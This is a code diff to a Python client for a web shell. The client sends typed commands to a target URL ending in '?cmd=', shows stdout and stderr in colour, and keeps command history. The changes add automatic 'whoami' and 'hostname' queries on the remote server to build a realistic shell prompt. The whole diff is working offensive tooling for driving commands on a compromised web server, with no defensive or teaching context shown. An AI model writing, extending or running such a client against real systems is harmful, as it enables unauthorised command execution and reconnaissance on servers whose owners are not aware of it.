@@ -13,13 +13,32 @@ def send_command(command, path, base_url):
 
     try:
         response = requests.get(url)
-        print(colored(response.text, 'green'))
+        output = response.text.strip()
+        if "STDERR:" in output:
+            stderr_output = output.split("STDERR:")[-1].strip()
+            stdout_output = output.split("STDERR:")[0].strip()
+            if stdout_output:
+                print(colored(stdout_output, 'green'))
+            if stderr_output:
+                print(colored(stderr_output, 'red'))
+        else:
+            print(colored(output, 'green'))
     except requests.RequestException as e:
         print(colored(f"Error: {e}", 'red'))
 
-def get_prompt(current_path):
-    user = colored("user", "cyan")
-    hostname = colored("webshell", "yellow")
+def get_remote_info(base_url, command):
+    encoded_command = urllib.parse.quote(command)
+    url = f"{base_url}{encoded_command}"
+    try:
+        response = requests.get(url)
+        return response.text.strip()
+    except requests.RequestException as e:
+        print(colored(f"Error retrieving {command}: {e}", 'red'))
+        return "unknown"
+
+def get_prompt(user, hostname, current_path):
+    user = colored(user, "cyan")
+    hostname = colored(hostname, "yellow")
     path = colored(current_path, "blue")
     return f"{user}@{hostname}:{path}$ "
 
@@ -33,6 +52,9 @@ if __name__ == "__main__":
         print(colored("Error: The provided URL must end with '?cmd=' for command execution.", "red"))
         sys.exit(1)
     
+    remote_user = get_remote_info(base_url, "whoami")
+    remote_host = get_remote_info(base_url, "hostname")
+    
     current_path = "/"
     history_file = ".shell_history"
     
@@ -43,7 +65,7 @@ if __name__ == "__main__":
     
     while True:
         try:
-            command = input(get_prompt(current_path))
+            command = input(get_prompt(remote_user, remote_host, current_path))
             readline.write_history_file(history_file)
         except (EOFError, KeyboardInterrupt):
             print(colored("\nExiting shell.", "red"))
